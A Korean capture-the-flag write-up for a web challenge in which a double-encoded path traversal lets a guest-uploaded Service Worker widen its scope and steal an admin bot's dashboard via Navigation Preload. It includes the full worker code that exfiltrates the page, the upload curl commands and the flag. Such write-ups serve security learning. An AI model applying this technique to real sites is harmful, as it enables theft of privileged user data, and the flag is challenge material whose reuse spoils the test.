---
ctf_name: "2026-D3CTF"
challenge_name: "Scope Drift"
category: "web"
difficulty: "medium"
author: "vestman828"
date: "2026-07-26"
tags: [web]
---

# Scope Drift

## 문제 설명

> 2026-D3CTF의 Scope Drift 문제입니다. Web입니다.

## 풀이

### 분석

서비스는 guest 사용자가 `/u/guest/` 아래에 HTML과 JavaScript 파일을 업로드할 수 있게 합니다. 업로드한 페이지를 관리자 봇에게 제출하면 봇은 그 페이지를 연 뒤 인증이 필요한 `/u/admin/dashboard`로 이동합니다. 목표는 guest 페이지의 JavaScript로 관리자 대시보드 내용을 읽는 것입니다.

일반적으로 `/u/guest/sw.js`에 등록한 Service Worker의 최대 scope는 worker가 위치한 `/u/guest/`이므로 `/u/admin/dashboard` 요청을 가로챌 수 없습니다. 하지만 업로드 검증과 정적 파일 제공 단계의 URL decoding 횟수가 달랐습니다.

다음 이중 인코딩 경로로 worker를 업로드할 수 있습니다.

```text
/u/guest/%252e%252e/scope-drift-sw.js
```

업로드 처리에서 한 번 디코딩하면 저장 경로는 `/u/guest/%2e%2e/scope-drift-sw.js`가 됩니다. 정적 파일을 요청할 때 다시 디코딩하고 정규화하면 브라우저에서는 `/u/scope-drift-sw.js`로 접근할 수 있습니다. 따라서 worker를 `/u/` scope로 등록하여 `/u/admin/dashboard`까지 제어할 수 있습니다.

처음에는 Service Worker의 fetch handler에서 `fetch(event.request)`로 대시보드를 다시 요청했지만 `403 forbidden`이 반환됐습니다. 관리자 권한이 브라우저의 원래 navigation 요청에만 적용되었기 때문입니다.

이를 해결하기 위해 Service Worker activation 단계에서 Navigation Preload를 활성화했습니다. 브라우저가 worker 기동과 병렬로 수행한 원래 navigation의 인증된 응답을 `event.preloadResponse`로 받고, 그 HTML을 `/webhook/guest`에 전송했습니다.

### 익스플로잇

Service Worker 코드는 다음과 같습니다.

```javascript
self.addEventListener('install', () => self.skipWaiting());

self.addEventListener('activate', event => {
  event.waitUntil((async () => {
    await self.registration.navigationPreload.enable();
    await self.clients.claim();
  })());
});

self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  if (url.pathname !== '/u/admin/dashboard') return;

  event.respondWith((async () => {
    const response = await event.preloadResponse || await fetch(event.request);
    const body = await response.clone().text();

    await fetch('/webhook/guest', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify({
        kind: 'admin-dashboard',
        status: response.status,
        body
      })
    });

    return response;
  })());
});
```

guest 페이지에서는 정규화된 worker URL과 넓어진 scope를 지정합니다.

```html
<!doctype html>
<meta charset="utf-8">
<script>
(async () => {
  await navigator.serviceWorker.register('/u/scope-drift-sw.js', {
    scope: '/u/'
  });
  await navigator.serviceWorker.ready;
})();
</script>
```

두 파일을 업로드한 뒤 guest 페이지를 관리자 봇에 제출합니다.

```bash
curl -X POST \
  --data-urlencode 'path=/u/guest/index.html' \
  --data-urlencode content@exploit/index.html \
  'https://INSTANCE/upload'

curl -X POST \
  --data-urlencode 'path=/u/guest/%252e%252e/scope-drift-sw.js' \
  --data-urlencode content@exploit/scope-drift-sw.js \
  'https://INSTANCE/upload'

curl -G \
  --data-urlencode 'url=http://INSTANCE/u/guest/index.html' \
  'https://INSTANCE/bot'
```

이후 `/inbox`를 확인하면 관리자 대시보드 HTML이 들어오고, 그 안의 private deployment note에서 플래그를 얻을 수 있습니다.

## 플래그

```text
d3ctf{s3rV1C3_W0rK3r_Scop3_c0NFUSIon120ab24}
```

## 배운 점

경로 보안 검사는 입력 문자열이 아니라 decoding과 정규화를 모두 마친 canonical path를 기준으로 해야 합니다. 또한 신뢰할 수 없는 사용자 콘텐츠와 관리자 페이지가 같은 origin에 있으면 Service Worker와 같은 브라우저 기능이 강력한 공격 표면이 됩니다.
